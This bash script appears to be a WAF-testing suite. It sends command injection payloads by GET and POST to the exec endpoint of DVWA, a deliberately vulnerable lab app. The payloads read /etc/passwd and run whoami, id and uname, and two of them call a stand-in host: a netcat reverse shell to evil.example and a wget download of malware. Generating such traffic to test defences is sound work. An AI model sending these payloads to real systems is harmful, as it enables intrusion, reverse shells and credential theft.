#!/bin/bash
# Command Injection payload suite
# Tools: curl
# Targets: DVWA command injection endpoint
# Estimated duration: 1-2 minutes
#
# NOTE: These are intentional security-testing payloads for generating
# attack traffic against F5 XC WAF. They are not real exploits.
set -euo pipefail

TARGET="${1:?Usage: 03-command-injection.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] Command Injection suite against ${TARGET}"
echo ""

# --- Direct curl-based command injection payloads ---
echo "[+] Sending command injection payloads via curl..."

# Payloads stored in a heredoc array to send against DVWA exec endpoint
read -r -d '' PAYLOAD_LIST <<'PAYLOAD_EOF' || true
127.0.0.1; cat /etc/passwd
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; uname -a
127.0.0.1 | cat /etc/passwd
127.0.0.1 | whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1; ls -la /etc/
127.0.0.1%0a cat /etc/passwd
127.0.0.1%0d%0a cat /etc/passwd
127.0.0.1; nc -e /bin/sh evil.example 4444
127.0.0.1; wget http://evil.example/malware -O /tmp/malware
PAYLOAD_EOF

while IFS= read -r payload; do
  [[ -z "$payload" ]] && continue
  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${payload}")

  echo "  Payload: ${payload}"

  # DVWA exec (GET)
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/dvwa/vulnerabilities/exec/?ip=${encoded}&Submit=Submit" \
    --max-time 10) || code="ERR"
  echo "    dvwa/exec (GET)  -> HTTP ${code}"

  # DVWA exec (POST)
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${BASE}/dvwa/vulnerabilities/exec/" \
    -d "ip=${encoded}&Submit=Submit" \
    --max-time 10) || code="ERR"
  echo "    dvwa/exec (POST) -> HTTP ${code}"
done <<<"$PAYLOAD_LIST"

echo ""
echo "[*] Command Injection suite complete"
